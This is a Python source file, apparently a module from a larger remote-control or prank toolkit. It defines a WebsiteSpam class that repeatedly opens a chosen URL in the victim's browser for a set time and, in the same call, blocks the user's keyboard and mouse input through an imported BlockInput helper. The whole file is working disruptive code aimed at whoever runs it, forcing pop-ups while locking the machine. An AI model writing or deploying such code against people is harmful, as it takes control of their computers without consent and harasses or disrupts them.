import threading
import webbrowser, time, multiprocessing
from ..input_output import BlockInput

class WebsiteSpam:
    def _spam_website(self, url, spamDelay, blocktime):
        t = 0
        while t < blocktime:
            webbrowser.open_new(url)
            t += spamDelay
            time.sleep(spamDelay)

    def show_website(self, url, blocktime = 0, spamDelay = 10, spam = 0):
        """Shows the user a website and blocks the input if specified"""
        spam = int(spam)
        blocktime = int(blocktime)
        if not spam:
            webbrowser.open(url)
        else:
            spamDelay = int(spamDelay)
            t = multiprocessing.Process(target = self._spam_website, args = (url, spamDelay, blocktime))
            t.start() 

        p = threading.Thread(target=self.blocker, args=(blocktime,))
        p.start()

    def blocker(self,blocktime):
        b = BlockInput()
        p = threading.Thread(target=b.block_smart_seconds, args=(blocktime,))
        p.start()
        
website_spam_obj = WebsiteSpam()